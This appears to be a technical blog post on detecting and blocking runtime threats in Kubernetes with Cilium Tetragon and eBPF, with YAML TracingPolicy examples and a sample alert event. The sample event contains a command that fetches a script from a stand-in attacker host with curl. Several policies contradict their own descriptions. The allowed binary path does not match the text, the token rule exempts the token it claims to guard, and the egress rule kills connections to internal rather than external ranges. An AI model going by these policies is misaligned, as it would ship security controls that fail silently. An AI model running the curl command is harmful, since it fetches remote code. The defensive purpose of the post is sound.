---
layout: post
title: "Implementing Runtime Threat Detection in Microservices with Cilium Tetragon and eBPF"
date: 2026-07-10 08:00:00 +0700
tags: [devsecops, kubernetes, ebpf, security]
description: "Learn how to leverage Cilium Tetragon and eBPF to detect and block runtime threats directly in the Linux kernel with minimal performance overhead."
image: "https://picsum.photos/seed/1618/1080/720"
thumbnail: "https://picsum.photos/seed/1618/400/300"
---

Your microservices are compiled, static scanned, and deployed behind a service mesh. Yet, at 3:00 AM, a zero-day vulnerability in a secondary Java parsing library allows an attacker to run arbitrary code on your checkout pod. Within three seconds, the compromised container executes a curl command, downloads an external shell script, writes a payload to a write-protected directory, and exfiltrates database credentials via DNS tunneling. If you are relying on traditional container security tools that parse `/var/log/audit/audit.log` or poll the `/proc` filesystem, you have already lost. The latency between the exploit occurrence and user-space detection is a lifetime in security terms. This is where Cilium Tetragon, powered by eBPF (Extended Berkeley Packet Filter), fundamentally redefines runtime security: by moving threat detection and active enforcement out of fragile user-space agents and directly into the Linux kernel.

![Implementing Runtime Threat Detection in Microservices with Cilium Tetragon and eBPF Diagram](/images/diagrams/implementing-runtime-threat-detection-microservices-cilium-tetragon-ebpf.svg)

## The Limitations of Legacy Runtime Security

To understand why eBPF-based enforcement is necessary, we must examine the architectural failures of the three legacy approaches that have dominated DevSecOps: `auditd` logging, dynamic library hijacking (`LD_PRELOAD`), and asynchronous user-space agents like traditional Falco configurations.

### 1. The Auditd Overhead and Tamperability
Historically, security teams configured `auditd` to capture system events. In high-throughput microservice environments, `auditd` is a performance bottleneck. Every syscall intercepted by `auditd` triggers a context switch to user space, writing events to disk. Under a load of 50,000 requests per second, this can consume 15% to 30% of system CPU capacity purely to process security events. Furthermore, `auditd` operates on the host kernel level without native awareness of Kubernetes constructs. Translating a process ID (PID) back to a specific namespace, pod, and container requires external correlation engines, which adds pipeline latency. Lastly, if an attacker escalates privileges to the root level within a container (or breaks out to the host), they can simply terminate the `auditd` daemon or wipe its local logs.

### 2. The Fragility of LD_PRELOAD
Dynamic library hooking using `LD_PRELOAD` inserts security checks by overriding standard library calls (like `glibc`). While this works for simple script-based environments, it has a fatal flaw in modern cloud-native systems: it is completely blind to statically compiled binaries. Go and Rust binaries compile system calls directly into the machine code, bypassing dynamic libraries entirely. An attacker running a statically compiled Go binary inside your container can call `sys_execve` directly, leaving `LD_PRELOAD` security agents completely oblivious to the threat.

### 3. Time-of-Check to Time-of-Use (TOCTOU) in User-Space Agents
Many modern container security systems collect kernel events using a kernel module or basic eBPF program, but delegate the policy evaluation and alerting to a daemon running in user space. Consider a system designed to detect when a process executes `sh`. The sequence of events unfolds as follows:
1. The kernel executes `sys_execve("/bin/sh")`.
2. The kernel-level hook catches the event and writes it to a ring buffer.
3. The user-space security daemon reads the event from the ring buffer.
4. The daemon evaluates the event against rules.
5. The daemon generates a Slack alert or triggers a Kubernetes API command to delete the pod.

The issue is latency. This entire loop takes anywhere from 50 milliseconds to several seconds depending on system load. In that time, the attacker's script has already executed, exfiltrated credentials, and self-deleted. The container deletion command arrives too late. The system has performed post-mortem reporting, not threat prevention.

## The eBPF Paradigm Shift: How Cilium Tetragon Works

eBPF (Extended Berkeley Packet Filter) bypasses these architectural limits by executing sandboxed programs directly inside the Linux kernel. Instead of forcing the kernel to send every system event to user space for inspection, eBPF allows developers to run safe, compiled bytecode inside the kernel's execution context.

Cilium Tetragon leverages this architecture to monitor and enforce security policies at the kernel level. It loads highly optimized BPF programs attached to kernel tracepoints, `kprobes` (kernel probes), `kretprobes` (kernel return probes), and Linux Security Modules (LSM) hooks.

Tetragon correlates low-level kernel activities (like process creation, file modifications, namespace modifications, and socket connections) with Kubernetes metadata. It does this by tracking namespace creation and container runtimes. When a process triggers a syscall, the eBPF program reads the task struct of the calling process, extracts its cgroup ID, and maps it to the namespace, pod name, and container ID stored in the Tetragon agent's in-kernel maps. This translation occurs inline, with near-zero overhead and zero disk-write dependency.

To pass events to user space for logging, Tetragon uses a modern BPF Ring Buffer (`BPF_MAP_TYPE_RINGBUF`), introduced in Linux kernel 5.8. Unlike the older Perf Buffer (`BPF_MAP_TYPE_PERF_EVENT_ARRAY`), the Ring Buffer shares memory pages directly between the kernel and user space. This eliminates the need to copy memory packets, allowing Tetragon to log millions of events per second with less than 2% CPU overhead.

## In-Kernel Policy Enforcement vs. Post-Facto User-Space Alerting

The defining capability of Cilium Tetragon is its ability to perform **in-kernel enforcement**. Tetragon does not just watch events pass by; it can actively intervene and stop security violations before they execute.

This is made possible by attaching BPF programs to kernel functions and using BPF helpers to modify execution state. The primary mechanism for stopping unauthorized processes is the `bpf_send_signal(9)` helper.

When a TracingPolicy is applied, the Tetragon user-space agent compiles the policy rules into a set of lookup keys and updates a series of BPF maps. When a hooked function (such as `sys_enter_execve`) is invoked, the in-kernel eBPF program performs a lookup on these maps. If a match is found (e.g., executing `/bin/sh` from a container labeled `app=payments-service`), the BPF program immediately triggers the `bpf_send_signal(9)` helper.

This helper sends a `SIGKILL` (signal 9) directly to the calling thread. Crucially, this signal is queued and executed within the kernel thread context before the kernel returns execution back to the user-space process. The binary never gets to run its first instruction. The threat is neutralized at the microsecond level.

Let's contrast the flow of a standard user-space alert loop with Tetragon's in-kernel enforcement loop:

| Metric / Stage | Legacy User-Space Agent (e.g., Falco) | Cilium Tetragon (In-Kernel) |
| :--- | :--- | :--- |
| **Detection Point** | Kernel Space | Kernel Space |
| **Evaluation Point** | User Space (Daemon) | Kernel Space (eBPF VM) |
| **Detection Latency** | 50ms - 2000ms | < 10 microseconds |
| **Enforcement Mechanism** | Kubernetes API (Pod deletion) / User script | `bpf_send_signal(9)` (SIGKILL) |
| **Prevention Capability** | Reactive (post-execution alert) | Proactive (prevents execution) |
| **CPU Overhead (under load)** | High (due to massive event copy to user-space) | Minimal (< 2% host CPU) |

## Hands-On: Configuring Tetragon TracingPolicies for Microservices

Tetragon policies are defined using Kubernetes Custom Resource Definitions (CRDs). You can configure cluster-wide rules with `TracingPolicy` or namespaced rules with `TracingPolicyNamespaced`. Let's look at three production scenarios.

### 1. Restricting Binary Execution in a Payments Service
For security-critical microservices (e.g., payment processing or auth services), the container should only run the main application binary. The presence of shells, curl, or package managers inside the container is a security risk.

The following `TracingPolicyNamespaced` intercepts the `sys_execve` system call. It blocks any binary execution in the `production` namespace under the `payments-service` pod, unless it is the allowed Go application binary `/app/payments-engine`.

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicyNamespaced
metadata:
  name: restrict-execution-payments
  namespace: production
spec:
  kprobes:
    - call: "sys_execve"
      syscall: true
      args:
        - index: 0
          type: "string"
      selectors:
        - matchPodLabels:
            - key: "app"
              operator: "In"
              values:
                - "payments-service"
          matchArgs:
            # Match any execution attempt under common binary directories
            - index: 0
              operator: "Prefix"
              values:
                - "/bin/"
                - "/usr/bin/"
                - "/usr/sbin/"
                - "/tmp/"
          matchArgsExclude:
            # Explicitly exclude the legitimate microservice binary
            - index: 0
              operator: "Equal"
              values:
                - "/bin/payments-engine"
          actions:
            # Terminate the violating process instantly
            - action: "Sigkill"
```

When an attacker exploits a RCE vulnerability and attempts to execute `/bin/sh` or `/usr/bin/curl`, Tetragon catches the call at `sys_execve`, evaluates the arguments, and kills the process before execution.

The stdout of the Tetragon agent will output a structured JSON event detailing the violation:

```json
{
  "process_exec": {
    "process": {
      "exec_id": "OTU0ODk2MDc2MTY4NDc1ODoxMDQ1Mjo1",
      "pid": 10452,
      "uid": 1000,
      "cwd": "/app",
      "binary": "/bin/sh",
      "arguments": "-c curl http://attacker.domain/malware.sh",
      "flags": "execve",
      "start_time": "2026-07-10T15:44:00Z",
      "pod": {
        "namespace": "production",
        "name": "payments-service-589d97bbf-xk89z",
        "container": {
          "id": "cri-o://59e87ba3a32f...",
          "name": "payments-service",
          "image": {
            "id": "docker.io/library/payments-service@sha256:7f45c..."
          }
        }
      }
    },
    "parent": {
      "pid": 10440,
      "binary": "/bin/payments-engine"
    }
  },
  "action": "SIGKILL",
  "policy_name": "restrict-execution-payments"
}
```

### 2. Protecting Kubernetes Service Account Tokens
A common post-exploitation step in Kubernetes is to read the service account token mounted inside the pod at `/var/run/secrets/kubernetes.io/serviceaccount/token`. If the pod's service account has elevated RBAC permissions, the attacker can hijack the cluster.

To protect this, we can monitor file reads on this specific path by hooking the `security_file_open` Linux Security Module (LSM) function. This hook is cleaner than checking `sys_openat` because it operates after the kernel's initial file permissions checks but before the file description is allocated to the process.

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: monitor-service-account-token
spec:
  kprobes:
    - call: "security_file_open"
      syscall: false
      args:
        - index: 0
          type: "file" # Struct file *
        - index: 1
          type: "int"  # Access flags
      selectors:
        - matchArgs:
            - index: 0
              operator: "Prefix"
              values:
                - "/var/run/secrets/kubernetes.io/serviceaccount/"
          matchNamespaces:
            - "production"
          matchArgsExclude:
            # Exclude legitimate reads by the application process
            - index: 0
              operator: "Equal"
              values:
                - "/var/run/secrets/kubernetes.io/serviceaccount/token"
          # We only want to notify and alert on this, not SIGKILL, to prevent breaking legitimate client initializations.
          actions:
            - action: "Notify"
```

### 3. Preventing Outbound Connections at the Syscall Level
If an attacker manages to run code but cannot execute new binaries, they may try to open a TCP connection to an external server using existing language runtimes (e.g. Python's `socket` library or Node's `http` module).

By tracing the `sys_connect` system call, Tetragon can inspect outbound connection attempts. The following policy detects and blocks connections to external IP ranges while allowing connections to the internal Kubernetes DNS resolver (`10.96.0.10`).

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: restrict-egress-connections
spec:
  kprobes:
    - call: "sys_connect"
      syscall: true
      args:
        - index: 1
          type: "sockaddr"
      selectors:
        - matchNamespaces:
            - "production"
          matchArgs:
            # Target TCP/UDP connections
            - index: 1
              operator: "Prefix"
              values:
                - "192.168."
                - "10."
          matchArgsExclude:
            # Allow Kubernetes DNS resolver IP
            - index: 1
              operator: "Equal"
              values:
                - "10.96.0.10"
          actions:
            - action: "Sigkill"
```

## Production Engineering: Real-World Failure Modes, Edge Cases, and Mitigations

Deploying eBPF-based security tooling to production clusters running thousands of containers introduces complex system-level failure modes. If you run Tetragon, you must plan for the following five issues.

### 1. BTF (BPF Type Format) Dependency and Kernel Upgrades
Tetragon does not compile BPF programs from source on each node. Instead, it relies on BTF (BPF Type Format) to dynamically inspect kernel structures. BTF maps kernel structural definitions (like `task_struct`) to offsets, allowing the same eBPF binary to run on different kernel configurations.

*   **Failure Mode:** If you deploy Tetragon on older Linux kernels (pre-5.4) or cloud-provider operating systems that do not expose BTF files at `/sys/kernel/btf/vmlinux`, the Tetragon DaemonSet pods will enter a `CrashLoopBackOff` status with the error: `failed to find BTF file`.
*   **Mitigation:** You must verify your host kernel configurations. Modern distributions like Ubuntu 20.04+, RHEL 8.2+, and Debian 11+ compile with `CONFIG_DEBUG_INFO_BTF=y` by default. If using custom or legacy kernels, you must pre-download the BTF file for your specific kernel release from the [BTFhub repository](https://github.com/aquasecurity/btfhub) and mount it into the Tetragon pod at `/var/lib/tetragon/btf`.

### 2. Ring Buffer Backpressure and Event Dropping
Under extreme system load—such as during a CI/CD build pod run or a logging burst—the rate of kernel events can exceed the rate at which the user-space Tetragon agent can consume them from the shared Ring Buffer.

*   **Failure Mode:** Tetragon drops events to prevent system instability. When this happens, security violations go unnoticed. You will see metrics like `tetragon_errors_total{error="ringbuf_loss"}` incrementing rapidly.
*   **Mitigation:**
    1. Tune the shared buffer size. By default, Tetragon allocates a moderate size for the Ring Buffer. You can increase this by setting the `--bpf-lib-ring-size` flag (e.g. to `67108864` bytes for 64MB of shared memory).
    2. Write strict policies. Avoid monitoring global syscall events. Push filters down to the eBPF layer using namespace, cgroup, or container-specific selectors within your `TracingPolicy` definitions.

### 3. CPU Overhead and System Lockups
Hooking highly active kernel paths can degrade host performance. If a pod performs thousands of small file writes per second, tracing `sys_write` globally will degrade system performance.

*   **Failure Mode:** The kernel eBPF verifier enforces a maximum instruction limit per program (1 million instructions) and forbids loops to prevent kernel crashes. However, even simple instruction paths executed 500,000 times per second across 64 CPU cores will cause noticeable CPU usage spikes in kernel context (`system CPU`).
*   **Mitigation:**
    *   Never trace `sys_read` or `sys_write` at the syscall level without narrow paths and namespace selectors.
    *   Favor LSM hooks like `security_file_open` or `security_inode_permission` over raw filesystem kprobes (`sys_openat`). LSM hooks run less frequently and execute after primary DAC (Discretionary Access Control) evaluations, filtering out unauthorized requests before eBPF processing.

### 4. BPF Map Capacity Exhaustion
Tetragon maintains a hash map of processes, namespaces, and pod structures in BPF maps. These maps have fixed sizes determined at load time.

*   **Failure Mode:** If you run serverless workloads (e.g., AWS Fargate, Knative) or job-heavy workloads that create and destroy millions of processes per hour, you may exhaust the process map size limit (`max_entries`). When this happens, Tetragon cannot track new processes, and your policy enforcement fails.
*   **Mitigation:** Monitor the map utilization using the `bpftool map show` utility. Increase the process cache configuration via the Tetragon DaemonSet command-line argument `--process-cache-size` (default is typically `65536`). Set this to `262144` or higher in highly dynamic environments.

### 5. Policy Drift and Alert Fatigue in CI/CD
Deploying strict `SIGKILL` policies in production without checking them against application updates is a common failure mode. A developer introducing a third-party library that invokes a child process will trigger a false positive, causing the microservice to fail.

*   **Mitigation:**
    *   **Audit Mode First:** Deploy every new `TracingPolicy` with the `Notify` action before promoting it to `Sigkill`. Monitor logs for at least a week to identify benign behaviors.
    *   **Automated Profiling:** Use your staging environment to automatically generate TracingPolicies. Run your integration tests while running Tetragon in audit mode, collect the triggered execution paths, and automatically build the allowed list of binaries and file reads.

## Conclusion and Opinionated Recommendations

Traditional user-space runtime security cannot keep pace with modern cloud-native threats. If you are serious about securing containerized microservices in production, you should migrate from user-space checking to in-kernel enforcement with eBPF and Cilium Tetragon.

To implement this successfully:
1.  **Enforce, Don't Just Alert:** Alerting on compromised nodes is too slow. Use `Sigkill` actions to block execution of unapproved binaries and access to sensitive file paths.
2.  **Optimize Policy Scope:** Use namespaces and pod selectors to limit the scope of your TracingPolicies. Never trace high-frequency syscalls globally.
3.  **Monitor Your eBPF Infrastructure:** Treat BPF map utilization and ring buffer loss metrics as critical indicators. If Tetragon drops events, your security model fails.

By shifting threat detection and containment directly into the kernel, you can protect your microservices against zero-day exploits and remote code execution with minimal impact on system performance.